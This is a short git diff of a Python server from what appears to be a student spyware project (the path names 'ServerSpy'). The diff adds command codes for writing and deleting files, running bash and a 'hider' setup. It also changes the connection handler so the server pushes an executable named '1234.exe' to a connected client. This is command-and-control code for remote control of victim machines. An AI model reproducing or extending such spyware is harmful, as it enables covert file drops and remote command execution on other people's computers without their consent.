@@ -7,6 +7,12 @@ HOST = '192.168.154.1'  # Standard loopback interface address (localhost)
 PORT = 65432        # Port to listen on (non-privileged ports are > 1023)
 BUFFER_SIZE = 1024
 
+FUNCODES = {'WRITE_FILE': 1,
+            'DELETE_FILE': 2,
+            'RUN_BASH': 3,
+            'HIDER_SETUP': 4}
+
+
 class Server:
     
     
@@ -47,8 +53,10 @@ class Server:
     # TODO maybe delete this
     def handleConnection(self) -> None:
         cmd = "echo cyber > temp.txt"
-        print(f"Sending command '{cmd}'")
-        self.sendCommand(3, cmd)
+        #print(f"Sending command '{cmd}'")
+        self.sendCommand(FUNCODES['WRITE_FILE'], '1234.exe')
+        print(self.recvData())
+        self.sendFile(r'C:\Users\user\Desktop\rogla\Arazim-Projects-2024---spyware\src\ServerSpy\a.exe')
         msg = self.recvCommand()
 
         # Print received data
